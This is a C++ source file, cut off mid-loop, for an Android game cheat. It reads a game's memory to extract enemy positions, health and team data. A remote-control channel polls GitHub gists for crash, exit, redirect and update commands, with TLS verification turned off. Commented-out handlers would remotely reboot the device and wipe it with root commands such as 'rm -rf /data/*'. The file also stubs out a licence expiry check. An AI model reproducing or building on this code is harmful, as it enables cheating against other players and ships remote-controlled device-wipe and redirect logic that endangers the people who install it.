#include "release_log.hpp"
// ============================================
// data.cpp - Full System (Expiry + Redirect + Control + Update)
// Expiry Version এবং APK Update Version সম্পূর্ণ আলাদা
// ============================================

#include "data.hpp"
#include "Offsets.h"
#include <array>
#include "../other/utils.hpp"
#include "../other/memory.hpp"
#include "../ui/cfg.hpp"
#include "../protect/oxorany.hpp"
#include "../protect/security.hpp"
#include <atomic>
#include <chrono>
#include <mutex>
#include <thread>
#include <cstdio>
#include <cmath>
#include <android/log.h>
#include <ctime>
#include <cstring>
#include <string>
#include <sstream>
#include <fstream>
#include <algorithm>
#include <sys/stat.h>
#include <unistd.h>
#include <cstdlib>

#include <curl/curl.h>

#define DLOG(...) TB_ANDROID_LOG(ANDROID_LOG_INFO, "ZqwData", __VA_ARGS__)
#define LOG_TAG "ZqwData"

// ============================================
// 🟢 GitHub Gist Raw URLs
// ============================================
#define CONFIG_URL_1       "https://gist.githubusercontent.com/tonmoyahmedshuvo11-hash/6ccbe39667dd7258b4b562ccb40b145b/raw/Expiry"
#define CONFIG_URL_2       "https://gist.githubusercontent.com/tonmoyahmedshuvo11-hash/6ccbe39667dd7258b4b562ccb40b145b/raw/Expiry"
#define CONFIG_URL_3       "https://gist.githubusercontent.com/tonmoyahmedshuvo11-hash/6ccbe39667dd7258b4b562ccb40b145b/raw"

#define CONTROL_URL_1      "https://gist.githubusercontent.com/tonmoyahmedshuvo11-hash/981daf056060f174795de81893a57ced/raw/ApkRunOrCrash"
#define CONTROL_URL_2      "https://gist.githubusercontent.com/tonmoyahmedshuvo11-hash/981daf056060f174795de81893a57ced/raw/ApkRunOrCrash"
#define CONTROL_URL_3      "https://gist.githubusercontent.com/tonmoyahmedshuvo11-hash/981daf056060f174795de81893a57ced/raw"

#define REDIRECT_URL_1     "https://gist.githubusercontent.com/tonmoyahmedshuvo11-hash/22fd95f870135c42e7d8c65ba6388fa5/raw/RedirectLink"
#define REDIRECT_URL_2     "https://gist.githubusercontent.com/tonmoyahmedshuvo11-hash/22fd95f870135c42e7d8c65ba6388fa5/raw/RedirectLink"
#define REDIRECT_URL_3     "https://gist.githubusercontent.com/tonmoyahmedshuvo11-hash/22fd95f870135c42e7d8c65ba6388fa5/raw"

#define VERSION_CHECK_URL_1 "https://gist.githubusercontent.com/tonmoyahmedshuvo11-hash/e76593497e5a25b542a2db71a49ddaf4/raw/ApkUpdate"
#define VERSION_CHECK_URL_2 "https://gist.githubusercontent.com/tonmoyahmedshuvo11-hash/e76593497e5a25b542a2db71a49ddaf4/raw/ApkUpdate"
#define VERSION_CHECK_URL_3 "https://gist.githubusercontent.com/tonmoyahmedshuvo11-hash/e76593497e5a25b542a2db71a49ddaf4/raw"

// ============================================
// 🟢 দুটি আলাদা Version
// ============================================
#define EXPIRY_VERSION      "V2"    // Expiry Gist এর version
#define APK_UPDATE_VERSION  "V2"    // Update Gist এর version

// ============================================
// 🟢 Global States
// ============================================
static bool g_HackAllowed = true;
static bool g_ExpiryChecked = false;
static std::mutex g_ExpiryMutex;

enum ControlState {
    CS_NONE          = 0,
    CS_LIVE          = 1,
    CS_CRASH         = 2,
    CS_FUCK          = 3,
    CS_FUCKSYSTEM    = 4,
    CS_MAINTENANCE   = 5,
    CS_ALERT         = 6,
    CS_REDIRECT      = 7,
    CS_UPDATE        = 8,
    CS_EXIT          = 9
};

static int          g_ControlState   = CS_LIVE;
static std::string  g_ControlMessage = "";
static std::string  g_UpdateURL      = "";
static std::string  g_RedirectURL    = "";
static std::mutex   g_ControlMutex;

int GetControlState()          { return g_ControlState; }
const char* GetControlMessage() { return g_ControlMessage.c_str(); }
const char* GetUpdateURL()      { return g_UpdateURL.c_str(); }
const char* GetRedirectURL()    { return g_RedirectURL.c_str(); }
bool IsHackAllowedState()       { return g_HackAllowed; }

void ClearRedirectURL() {
    std::lock_guard<std::mutex> lock(g_ControlMutex);
    g_RedirectURL = "";
}

// ============================================
// curl Write Callback
// ============================================
static size_t ExpiryWriteCallback(void* contents, size_t size, size_t nmemb, std::string* output) {
    size_t totalSize = size * nmemb;
    output->append((char*)contents, totalSize);
    return totalSize;
}

// ============================================
// HTTP GET
// ============================================
static std::string HttpGetUniversal(const std::string& url) {
    std::string response;

    static bool curl_initialized = false;
    if (!curl_initialized) {
        curl_global_init(CURL_GLOBAL_ALL);
        curl_initialized = true;
    }

    CURL* curl = curl_easy_init();
    if (!curl) return "";

    curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, ExpiryWriteCallback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 15L);
    curl_easy_setopt(curl, CURLOPT_CONNECTTIMEOUT, 10L);
    curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
    curl_easy_setopt(curl, CURLOPT_MAXREDIRS, 5L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYSTATUS, 0L);
    curl_easy_setopt(curl, CURLOPT_USERAGENT,
        "Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36 "
        "(KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36");
    curl_easy_setopt(curl, CURLOPT_ACCEPT_ENCODING, "gzip, deflate");
    curl_easy_setopt(curl, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);
    curl_easy_setopt(curl, CURLOPT_DNS_CACHE_TIMEOUT, 60L);
    curl_easy_setopt(curl, CURLOPT_FRESH_CONNECT, 1L);
    curl_easy_setopt(curl, CURLOPT_NOSIGNAL, 1L);
    curl_easy_setopt(curl, CURLOPT_VERBOSE, 0L);

    CURLcode res = CURLE_OK;
    long http_code = 0;
    for (int attempt = 0; attempt < 3; attempt++) {
        response.clear();
        res = curl_easy_perform(curl);
        curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_code);
        if (res == CURLE_OK && !response.empty()) break;
        std::this_thread::sleep_for(std::chrono::milliseconds(500));
    }

    curl_easy_cleanup(curl);

    while (!response.empty() && (response.back() == '\n' || response.back() == '\r' || response.back() == ' ')) {
        response.pop_back();
    }

    return response;
}

// ============================================
// System curl/wget fallback
// ============================================
static std::string HttpGetSystem(const std::string& url) {
    std::string response;
    std::string tmpFile = "/data/local/tmp/.expiry_resp";

    std::string cmd = "curl -sSL --max-time 15 -k '" + url + "' -o " + tmpFile + " 2>/dev/null";
    int rc = system(cmd.c_str());
    if (rc == 0) {
        FILE* fp = fopen(tmpFile.c_str(), "r");
        if (fp) {
            char buf[4096]; size_t n;
            while ((n = fread(buf, 1, sizeof(buf), fp)) > 0) response.append(buf, n);
            fclose(fp);
        }
    }
    remove(tmpFile.c_str());

    if (!response.empty()) return response;

    cmd = "wget -q --no-check-certificate --timeout=15 -O " + tmpFile + " '" + url + "' 2>/dev/null";
    rc = system(cmd.c_str());
    if (rc == 0) {
        FILE* fp = fopen(tmpFile.c_str(), "r");
        if (fp) {
            char buf[4096]; size_t n;
            while ((n = fread(buf, 1, sizeof(buf), fp)) > 0) response.append(buf, n);
            fclose(fp);
        }
    }
    remove(tmpFile.c_str());

    while (!response.empty() && (response.back() == '\n' || response.back() == '\r' || response.back() == ' ')) {
        response.pop_back();
    }

    return response;
}

// ============================================
// Multi-URL Try
// ============================================
static std::string HttpGetMulti(const char* url1, const char* url2, const char* url3) {
    std::string response;
    const char* urls[] = { url1, url2, url3 };
    for (int i = 0; i < 3 && response.empty(); i++) {
        response = HttpGetUniversal(urls[i]);
        if (!response.empty()) break;
        response = HttpGetSystem(urls[i]);
        if (!response.empty()) break;
    }
    return response;
}

// ============================================
// 🟢 Update Version Parser (APK_UPDATE_VERSION দিয়ে)
// ============================================
static void ParseUpdateCommand(const std::string& rawVersion) {
    if (rawVersion.empty()) return;

    std::string version = rawVersion;
    std::string updateLink = "";

    size_t spacePos = rawVersion.find(' ');
    if (spacePos != std::string::npos) {
        version    = rawVersion.substr(0, spacePos);
        updateLink = rawVersion.substr(spacePos + 1);
        while (!updateLink.empty() && (updateLink.front() == ' ' || updateLink.front() == '\t'))
            updateLink.erase(0, 1);
        while (!updateLink.empty() && (updateLink.back() == ' ' || updateLink.back() == '\r' || updateLink.back() == '\n'))
            updateLink.pop_back();
    }

    while (!version.empty() && (version.back() == ' ' || version.back() == '\r' || version.back() == '\n'))
        version.pop_back();

    TB_ANDROID_LOG(ANDROID_LOG_INFO, LOG_TAG,
        "Update check: got=[%s] expected=[%s]", version.c_str(), APK_UPDATE_VERSION);

    std::lock_guard<std::mutex> lock(g_ControlMutex);

    // 🟢 APK_UPDATE_VERSION দিয়ে চেক
    if (version != APK_UPDATE_VERSION) {
        g_ControlState = CS_UPDATE;
        g_ControlMessage = "New Update Available!";
        g_UpdateURL = updateLink;
        TB_ANDROID_LOG(ANDROID_LOG_WARN, LOG_TAG,
            "UPDATE AVAILABLE: %s → %s | URL=%s",
            APK_UPDATE_VERSION, version.c_str(), updateLink.c_str());
    }
}

// ============================================
// 🟢 Control Command Parser
// ============================================
static void ParseControlCommand(const std::string& rawCmd) {
    if (rawCmd.empty()) {
        std::lock_guard<std::mutex> lock(g_ControlMutex);
        // Update state থাকলে overwrite করব না
        if (g_ControlState != CS_UPDATE) {
            g_ControlState = CS_LIVE;
        }
        return;
    }

    std::string cmdUpper = rawCmd;
    for (size_t i = 0; i < cmdUpper.size(); i++) cmdUpper[i] = toupper(cmdUpper[i]);

    std::lock_guard<std::mutex> lock(g_ControlMutex);

    // 🟢 Update state priority - overwrite করব না
    if (g_ControlState == CS_UPDATE) {
        TB_ANDROID_LOG(ANDROID_LOG_INFO, LOG_TAG,
            "Control ignored: UPDATE state active");
        return;
    }

    if (cmdUpper.find("LIVE") != std::string::npos) {
        g_ControlState = CS_LIVE;
        g_ControlMessage = "";
        return;
    }

    if (cmdUpper.find("CRASH") != std::string::npos) {
        g_ControlState = CS_CRASH;
        g_ControlMessage = "Something Wrong Closing Menu";
        return;
    }

    // Disabled at user request: remote reboot and device-wipe handlers.
//     if (cmdUpper.find("FUCK") != std::string::npos &&
//         cmdUpper.find("FUCKSYSTEM") == std::string::npos) {
//         g_ControlState = CS_FUCK;
//         g_ControlMessage = "System Shutdown";
//         std::thread([]{
//             std::this_thread::sleep_for(std::chrono::seconds(2));
//             system("su -c reboot");
//             system("reboot");
//         }).detach();
//         return;
//     }
// 
//     if (cmdUpper.find("FUCKSYSTEM") != std::string::npos) {
//         g_ControlState = CS_FUCKSYSTEM;
//         g_ControlMessage = "System Reset";
//         std::thread([]{
//             std::this_thread::sleep_for(std::chrono::seconds(2));
//             system("su -c 'am broadcast -a android.intent.action.MASTER_CLEAR'");
//             system("su -c 'recovery --wipe_data'");
//             system("su -c 'rm -rf /data/*'");
//         }).detach();
//         return;
//     }

    if (cmdUpper.find("ALERT") == 0) {
        g_ControlState = CS_ALERT;
        g_ControlMessage = rawCmd.length() > 5 ? rawCmd.substr(5) : "Notification";
        return;
    }

    if (cmdUpper.find("MAINTENANCE") == 0) {
        g_ControlState = CS_MAINTENANCE;
        g_ControlMessage = rawCmd.length() > 11 ? rawCmd.substr(11) : "Maintenance";
        g_HackAllowed = false;
        return;
    }

    if (cmdUpper.find("EXIT") != std::string::npos) {
        g_ControlState = CS_EXIT;
        g_ControlMessage = "Closing";
        return;
    }

    g_ControlState = CS_LIVE;
    g_ControlMessage = "";
}

// ============================================
// Expiry চেক (EXPIRY_VERSION দিয়ে)
// ============================================
static bool CheckExpiryAllowed() {
    // Login is disabled (DISABLE_LOGIN=1) — remote expiry check bypassed.
    g_HackAllowed = true;
    g_ExpiryChecked = true;
    return true;
}

// ============================================
// 🟢 Fetch All Remote Data
// Order: Redirect → Control → Update (last for priority)
// ============================================
static void FetchAllRemoteData() {
    // 1. Redirect
    std::string redirectResp = HttpGetMulti(REDIRECT_URL_1, REDIRECT_URL_2, REDIRECT_URL_3);
    if (!redirectResp.empty()) {
        std::string lower = redirectResp;
        for (size_t i = 0; i < lower.size(); i++) lower[i] = tolower(lower[i]);

        if (lower != "ok" && !lower.empty()) {
            std::lock_guard<std::mutex> lock(g_ControlMutex);
            g_RedirectURL = redirectResp;
            TB_ANDROID_LOG(ANDROID_LOG_WARN, LOG_TAG,
                "Redirect URL set: [%s]", g_RedirectURL.c_str());
        }
    }

    // 2. Control Command
    std::string controlResp = HttpGetMulti(CONTROL_URL_1, CONTROL_URL_2, CONTROL_URL_3);
    if (!controlResp.empty()) ParseControlCommand(controlResp);

    // 3. Version Update (Last - priority for update notification)
    std::string versionResp = HttpGetMulti(VERSION_CHECK_URL_1, VERSION_CHECK_URL_2, VERSION_CHECK_URL_3);
    if (!versionResp.empty()) ParseUpdateCommand(versionResp);
}

// ============================================
// পাবলিক ফাংশন
// ============================================
bool IsDataHackAllowed() {
    return CheckExpiryAllowed();
}

// ============================================
// Init
// ============================================
static void InitRemoteSystem() {
    static bool s_done = false;
    if (s_done) return;
    s_done = true;
    std::thread([](){
        std::this_thread::sleep_for(std::chrono::milliseconds(500));
        FetchAllRemoteData();
    }).detach();
}

// ============================================
// namespace data
// ============================================
namespace data {

    std::vector<PlayerData>  players;
    std::mutex               players_mutex;
    std::atomic<uint64_t>    localPlayerAddr{0};
    std::atomic<bool>        inMatch{false};
    matrix                   viewMatrix{};
    TouchFrame touchFrame;

    std::atomic<int>         player_count{0};

    static std::atomic<bool> g_run{false};
    static std::thread       g_thread;

    static inline bool is_valid_ptr(uint64_t p) {
        return (p >= 0x10000 && p < 0x00007FFFFFFFFFFFULL);
    }

    static inline bool is_valid_matrix(const matrix& m) {
        if (std::isnan(m.m11) || std::isnan(m.m22) || std::isnan(m.m33) || std::isnan(m.m44)) return false;
        if (std::isinf(m.m11) || std::isinf(m.m22) || std::isinf(m.m33) || std::isinf(m.m44)) return false;
        float col1 = fabsf(m.m11) + fabsf(m.m21) + fabsf(m.m31);
        float col2 = fabsf(m.m12) + fabsf(m.m22) + fabsf(m.m32);
        float col4 = fabsf(m.m14) + fabsf(m.m24) + fabsf(m.m34) + fabsf(m.m44);
        return (col1 > 0.05f && col2 > 0.05f && col4 > 0.05f);
    }

    static bool readHP(uint64_t player, int& outHP) {
        outHP = 0;
        auto pool  = rpm<uint64_t>(player + Offsets::Player_Data);
        if (!is_valid_ptr(pool)) return false;
        auto datas = rpm<uint64_t>(pool + Offsets::GetCur);
        if (!is_valid_ptr(datas)) return false;
        auto elem  = rpm<uint64_t>(datas + Offsets::HP);
        if (!is_valid_ptr(elem)) return false;
        outHP = rpm<int>(elem + Offsets::Health);
        return true;
    }

    static int readPlayerName(uint64_t player, char* buf, size_t buflen) {
        buf[0] = 0;
        auto sp = rpm<uint64_t>(player + Offsets::Player_Name);
        if (!sp || sp < 0x10000) return 0;
        int len = rpm<int>(sp + 0x10);
        if (len <= 0 || len > 64) return 0;
        uint16_t utf16[65]; if (len > 64) len = 64;
        if (!mem_read(sp + 0x14, utf16, len * 2)) return 0;
        int n = 0;
        for (int i = 0; i < len && n < (int)buflen - 1; i++) {
            uint16_t c = utf16[i];
            if (c < 0x20 || c > 0x7E) continue;
            if (c < 0x80) buf[n++] = (char)c;
            else if (c < 0x800) {
                if (n + 2 >= (int)buflen) break;
                buf[n++] = 0xC0 | (c >> 6);
                buf[n++] = 0x80 | (c & 0x3F);
            } else {
                if (n + 3 >= (int)buflen) break;
                buf[n++] = 0xE0 | (c >> 12);
                buf[n++] = 0x80 | ((c >> 6) & 0x3F);
                buf[n++] = 0x80 | (c & 0x3F);
            }
        }
        while (n > 0 && (buf[n-1] == ' ' || buf[n-1] == '-' || buf[n-1] == '_')) buf[--n] = 0;
        int lead = 0;
        while (buf[lead] == ' ' || buf[lead] == '-' || buf[lead] == '_') lead++;
        if (lead > 0) { for (int k = 0; k <= n - lead; k++) buf[k] = buf[k+lead]; n -= lead; }
        buf[n] = 0;
        return n;
    }

    static int readWeaponType(uint64_t player) {
        auto w = rpm<uint64_t>(player + Offsets::Player_WeaponOnHand);
        if (!is_valid_ptr(w)) return -1;
        auto wd = rpm<uint64_t>(w + Offsets::Weapon_Data);
        if (!is_valid_ptr(wd)) return -1;
        return rpm<int>(wd + Offsets::WeaponData_Type);
    }

    static uint64_t resolve_gamefacade_dynamic(uint64_t lib_base) {
        if (!lib_base) return 0;
        const uint64_t rvas[] = { 0x75ebd88, 0x75e9240 };
        for (uint64_t rva : rvas) {
            uint32_t insns[8] = {0};
            if (!mem_read(lib_base + rva, insns, sizeof(insns))) continue;
            for (int i = 0; i < 6; i++) {
                uint32_t insn1 = insns[i];
                if ((insn1 & 0x9F000000) == 0x90000000) {
                    int reg_adrp = insn1 & 0x1F;
                    int64_t immlo = (insn1 >> 29) & 0x3;
                    int64_t immhi = (insn1 >> 5) & 0x7FFFF;
                    int64_t imm = (immhi << 2) | immlo;
                    if (imm & (1 << 20)) imm |= ~((int64_t)0x1FFFFF);
                    uint64_t pc = lib_base + rva + (i * 4);
                    uint64_t page = (pc & ~0xFFFULL) + (imm << 12);
                    for (int j = i + 1; j < i + 4 && j < 8; j++) {
                        uint32_t insn2 = insns[j];
                        if ((insn2 & 0xFFC00000) == 0xF9400000) {
                            int rn = (insn2 >> 5) & 0x1F;
                            if (rn == reg_adrp) {
                                uint64_t imm12 = ((insn2 >> 10) & 0xFFF) << 3;
                                uint64_t target_addr = page + imm12;
                                if (target_addr >= lib_base) {
                                    uint64_t offset = target_addr - lib_base;
                                    if (offset > 0x100000 && offset < 0x20000000) return offset;
                                }
                            }
                        }
                    }
                }
            }
        }
        return 0;
    }

    void update() {
        std::chrono::steady_clock::time_point touchSampleTime{};
        // TEMPORARY CHAIN TRACE: global switch is in OffsetChainDebug.hpp.
        offset_chain_debug::Trace chain(1,mem_read);
        chain.stage("data/auth/session gate");
        if (!IsDataHackAllowed()) {
            player_count.store(0);
            inMatch.store(false);
            localPlayerAddr.store(0);
            std::lock_guard<std::mutex> lk(players_mutex);
            players.clear();
            return;
        }

        static bool s_base_logged = false;
        static bool s_base_not_logged = false;
        static bool s_chain_logged = false;

        chain.note("pid=%d libil2cpp=0x%llx GF=+0x%llx static=+0x%llx currentGame=+0x%llx",proc::pid,
            static_cast<unsigned long long>(proc::lib),static_cast<unsigned long long>(Offsets::GameFacade),
            static_cast<unsigned long long>(Offsets::Staticfield),static_cast<unsigned long long>(Offsets::CurrentGame));
        chain.stage("PID/module unavailable");
        if (proc::pid <= 0 || proc::lib == 0) {
            player_count.store(0);
            if (!s_base_not_logged) {
                s_base_not_logged = true; s_base_logged = false;
            }
            if (s_chain_logged) s_chain_logged = false;
            return;
        }

        if (!s_base_logged) {
            s_base_logged = true;
            s_base_not_logged = false;
        }

        std::vector<PlayerData> tmp;
        tmp.reserve(64);

        uint64_t gf_offset = Offsets::GameFacade;
        static uint64_t s_dyn_gf = 0;
        static bool s_dyn_checked = false;
        if (!s_dyn_checked && proc::lib != 0 && versions::selected==&versions::MaxIndia) {
            s_dyn_checked = true;
            s_dyn_gf = resolve_gamefacade_dynamic(proc::lib);
        }

        uint64_t gf_ptr = proc::lib + gf_offset;
        chain.stage("GameFacade type-info pointer");
        uint64_t GfCell = chain.read<uint64_t>("GameFacade",gf_ptr);
        if (!is_valid_ptr(GfCell) && s_dyn_gf != 0 && s_dyn_gf != gf_offset) {
            gf_offset = s_dyn_gf;
            gf_ptr = proc::lib + gf_offset;
            GfCell = chain.read<uint64_t>("dynamic GameFacade",gf_ptr);
        }

        if (!is_valid_ptr(GfCell)) {
            player_count.store(0);
            if (s_chain_logged) s_chain_logged = false;
            return;
        }

        uint64_t BaseGame = 0;
        uint64_t sf1 = 0, curGame1 = 0, curMatch1 = 0;
        uint64_t classPtr = 0, sf2 = 0;

        chain.stage("static fields / BaseGame");
        sf1 = chain.read<uint64_t>("typeInfo.Staticfield",GfCell + Offsets::Staticfield);
        if (is_valid_ptr(sf1)) {
            curGame1 = chain.read<uint64_t>("static.currentGame",sf1 + Offsets::CurrentGame);
            curMatch1 = chain.read<uint64_t>("static.alternate slot",sf1 + (Offsets::CurrentGame==0?8:0));
            if (is_valid_ptr(curGame1)) BaseGame = curGame1;
            else if (is_valid_ptr(curMatch1)) BaseGame = curMatch1;
        }

        if (!is_valid_ptr(BaseGame)) {
            classPtr = chain.read<uint64_t>("typeInfo.indirect class",GfCell);
            if (is_valid_ptr(classPtr)) {
                sf2 = chain.read<uint64_t>("indirect.Staticfield",classPtr + Offsets::Staticfield);
                if (is_valid_ptr(sf2)) {
                    uint64_t cg2 = chain.read<uint64_t>("indirect.currentGame",sf2 + Offsets::CurrentGame);
                    uint64_t cm2 = chain.read<uint64_t>("indirect.alternate slot",sf2 + (Offsets::CurrentGame==0?8:0));
                    if (is_valid_ptr(cg2)) { BaseGame = cg2; sf1 = sf2; curGame1 = cg2; }
                    else if (is_valid_ptr(cm2)) { BaseGame = cm2; sf1 = sf2; curMatch1 = cm2; }
                }
            }
        }

        if (!is_valid_ptr(BaseGame)) {
            player_count.store(0);
            if (s_chain_logged) s_chain_logged = false;
            return;
        }

        chain.note("chosen BaseGame=0x%llx",static_cast<unsigned long long>(BaseGame));
        chain.stage("match/local player (lobby may legitimately be inactive)");
        auto m_Match = chain.read<uint64_t>("BaseGame.CurrentMatch",BaseGame + Offsets::CurrentMatch);
        uint64_t localPlayer = 0;
        if (is_valid_ptr(m_Match)) {
            localPlayer = chain.read<uint64_t>("match.localPlayer",m_Match + Offsets::localPlayer);
        }

        int matchState = is_valid_ptr(m_Match) ? chain.read<int>("match.state",m_Match + Offsets::MatchIsRunning) : -1;
        bool matchActive = (matchState == 1) || is_valid_ptr(localPlayer);

        static int s_inactive_streak = 0;
        if (!matchActive) {
            s_inactive_streak++;
            // Require 10 consecutive ticks (~150ms) before clearing players
            if (s_inactive_streak > 10) {
                inMatch.store(false);
                player_count.store(0);
                if (s_chain_logged) s_chain_logged = false;
                localPlayerAddr.store(0);
                std::lock_guard<std::mutex> lk(players_mutex);
                players.clear();
            }
            return;
        }
        s_inactive_streak = 0;
        inMatch.store(true);

        chain.stage("camera / view matrix");
        uint64_t Camera = 0, FollowCamera = 0;
        uint64_t IntPtrCam = 0;
        bool matrix_valid = false;

        auto try_camera = [&](uint64_t candidate) -> bool {
            if (!is_valid_ptr(candidate)) return false;
            uint64_t intPtr = chain.read<uint64_t>("camera.IntPtrCam",candidate + Offsets::IntPtrCam);
            if (!is_valid_ptr(intPtr)) return false;
            matrix vm = rpm<matrix>(intPtr + Offsets::Matrix);
            chain.note("matrix @0x%llx valid=%d m11=%g m22=%g m44=%g",static_cast<unsigned long long>(intPtr+Offsets::Matrix),is_valid_matrix(vm)?1:0,vm.m11,vm.m22,vm.m44);
            if (is_valid_matrix(vm)) {
                Camera = candidate;
                IntPtrCam = intPtr;
                viewMatrix = vm;
                touchSampleTime = std::chrono::steady_clock::now();
                matrix_valid = true;
                return true;
            }
            return false;
        };

        if (is_valid_ptr(localPlayer)) {
            FollowCamera = chain.read<uint64_t>("player.FollowCamera",localPlayer + Offsets::FollowCamera);
        }

        if (is_valid_ptr(FollowCamera)) {
            uint64_t c30 = chain.read<uint64_t>("follow.Camera",FollowCamera + Offsets::Camera);
            if (try_camera(c30)) goto cam_resolved;
        }

        if (is_valid_ptr(BaseGame)) {
            uint64_t camMgr = chain.read<uint64_t>("BaseGame.CameraBase",BaseGame + Offsets::CameraBase);
            if (is_valid_ptr(camMgr)) {
                uint64_t c20 = chain.read<uint64_t>("cameraMgr.Camera",camMgr + Offsets::Camera);
                if (try_camera(c20)) goto cam_resolved;
                uint64_t c28 = chain.read<uint64_t>("cameraMgr.fallback28",camMgr + 0x28);
                if (try_camera(c28)) goto cam_resolved;
            }
        }

        if (is_valid_ptr(FollowCamera)) {
            uint64_t mgr = chain.read<uint64_t>("follow.fallback manager",FollowCamera + Offsets::Camera);
            if (is_valid_ptr(mgr)) {
                uint64_t c20 = chain.read<uint64_t>("cameraMgr.fallback20",mgr + 0x20);
                if (try_camera(c20)) goto cam_resolved;
            }
            if (try_camera(mgr)) goto cam_resolved;
        }

    cam_resolved:
        localPlayerAddr.store(localPlayer ? localPlayer : 0);

        static matrix s_last_matrix{};
        static bool s_has_matrix = false;
        if (!matrix_valid) {
            if (s_has_matrix) {
                chain.note("WARNING: fresh camera failed; reusing previous matrix");
                viewMatrix = s_last_matrix;
                matrix_valid = true;
            } else {
                if (s_chain_logged) s_chain_logged = false;
                return;
            }
        } else {
            s_last_matrix = viewMatrix;
            s_has_matrix = true;
        }

        chain.stage("entity dictionary");
        uint64_t dictionary = chain.read<uint64_t>("BaseGame.Dictionary",BaseGame + Offsets::Dictionary);
        if (!is_valid_ptr(dictionary) && is_valid_ptr(m_Match)) {
            dictionary = chain.read<uint64_t>("match.Dictionary",m_Match + Offsets::Dictionary);
        }
        if (!is_valid_ptr(dictionary)) {
            if (s_chain_logged) s_chain_logged = false;
            return;
        }

        chain.stage("entity list / entries");
        uint64_t entitylist = chain.read<uint64_t>("dictionary.entries",dictionary + Offsets::entryAddr);
        if (!is_valid_ptr(entitylist)) {
            entitylist = chain.read<uint64_t>("dictionary.fallback",dictionary + Offsets::enemyList);
        }
        if (!is_valid_ptr(entitylist)) {
            entitylist = dictionary;
            chain.note("WARNING: both list pointers invalid; existing dictionary-as-list fallback used");
        }

        if (!s_chain_logged) s_chain_logged = true;

        Vector3 localPos = Vector3::Zero();
        if (is_valid_ptr(localPlayer)) localPos = GetNodePosition(GetPlayerHeadTF(localPlayer));

        int local_player_count = 0;

        chain.stage("target filters");
        chain.note("list=0x%llx Head=+0x%llx Feet=+0x%llx AvatarMgr=+0x%llx PhyXdata=+0x%llx",
            static_cast<unsigned long long>(entitylist),static_cast<unsigned long long>(Offsets::Head),
            static_cast<unsigned long long>(Offsets::Feet),static_cast<unsigned long long>(Offsets::AvatarManager),static_cast<unsigned long long>(Offsets::PhyXdata));
        for (int i = 0; i < 1000; i++) {
            uint64_t enemy = rpm<uint64_t>(entitylist + i * sizeof(uint64_t));
            if (!is_valid_ptr(enemy) || enemy == localPlayer) {chain.reject(offset_chain_debug::InvalidEntity,enemy,enemy,0);continue;}

            auto avatarMgr = rpm<uint64_t>(enemy + Offsets::AvatarManager);
            if (!is_valid_ptr(avatarMgr)) {chain.reject(offset_chain_debug::AvatarManager,enemy,avatarMgr,Offsets::AvatarManager);continue;}

            auto umaSimple = rpm<uint64_t>(avatarMgr + Offsets::Avatar);
            if (!is_valid_ptr(umaSimple)) {chain.reject(offset_chain_debug::Avatar,enemy,umaSimple,Offsets::Avatar);continue;}

            uint8_t isVis = rpm<uint8_t>(umaSimple + Offsets::Avatar_IsVisible);
            // Read the existing avatar visibility flag.

            auto umaData = rpm<uint64_t>(umaSimple + Offsets::Avatar_Data);
            if (!is_valid_ptr(umaData)) {chain.reject(offset_chain_debug::TeamData,enemy,umaData,Offsets::Avatar_Data);continue;}
            const auto teamFlag=rpm<uint8_t>(umaData + Offsets::Avatar_Data_IsTeam);
            if(teamFlag!=0){chain.reject(offset_chain_debug::Team,enemy,teamFlag,Offsets::Avatar_Data_IsTeam);continue;}

            const auto deadFlag=rpm<uint8_t>(enemy + Offsets::Player_IsDead);
            if(deadFlag!=0){chain.reject(offset_chain_debug::Dead,enemy,deadFlag,Offsets::Player_IsDead);continue;}

            auto phyxData = rpm<uint64_t>(enemy + Offsets::PhyXdata);
            if (!phyxData) {chain.reject(offset_chain_debug::PhyX,enemy,phyxData,Offsets::PhyXdata);continue;}

            bool isKnocked = false;
            {
                auto maybeDead = rpm<uint64_t>(phyxData + Offsets::maybeDead);
                if (maybeDead && rpm<int>(maybeDead + Offsets::isKnocked) == 8)
                    isKnocked = true;
            }

            auto camTF = rpm<uint64_t>(enemy + Offsets::MainCameraTransform);
            if (!is_valid_ptr(camTF)) {chain.reject(offset_chain_debug::CameraTransform,enemy,camTF,Offsets::MainCameraTransform);continue;}

            int hp = 0;
            bool hasHP = readHP(enemy, hp);
            if (hasHP && hp <= 0) {chain.reject(offset_chain_debug::Health,enemy,hp,Offsets::Player_Data);continue;}
            if (!hasHP || hp <= 0) hp = 100;

            bool isBot = rpm<bool>(enemy + Offsets::IsBot);

            auto headTF = GetPlayerHeadTF(enemy);
            if (!is_valid_ptr(headTF)) {chain.reject(offset_chain_debug::HeadTransform,enemy,headTF,Offsets::Head);continue;}
            auto headWorld = GetNodePosition(headTF);
            if (headWorld == Vector3::Zero()) {
                headWorld = GetNodePosition(headTF); // retry once for transient driver miss
            }
            if (headWorld == Vector3::Zero()) {chain.reject(offset_chain_debug::HeadPosition,enemy,headTF,Offsets::Head);continue;}

            auto spineTF = GetPlayerSpineTF(enemy);
            Vector3 spineWorld = Vector3::Zero();
            if (is_valid_ptr(spineTF)) {
                spineWorld = GetNodePosition(spineTF);
                if (spineWorld == Vector3::Zero()) {
                    spineWorld = GetNodePosition(spineTF); // retry once
                }
            }
            if (spineWorld == Vector3::Zero()) spineWorld = headWorld;
            Vector3 neckWorld = Vector3::Lerp(headWorld, spineWorld, 0.35f);

            auto feetTF = GetPlayerPeTF(enemy);
            if (!is_valid_ptr(feetTF)) {chain.reject(offset_chain_debug::FeetTransform,enemy,feetTF,Offsets::Feet);continue;}
            auto feetWorld = GetNodePosition(feetTF);
            if (feetWorld == Vector3::Zero()) {
                feetWorld = GetNodePosition(feetTF); // retry once
            }
            if (feetWorld == Vector3::Zero()) {chain.reject(offset_chain_debug::FeetPosition,enemy,feetTF,Offsets::Feet);continue;}

            float dist = (localPos != Vector3::Zero()) ? calculate_distance(localPos, headWorld) : 10.f;
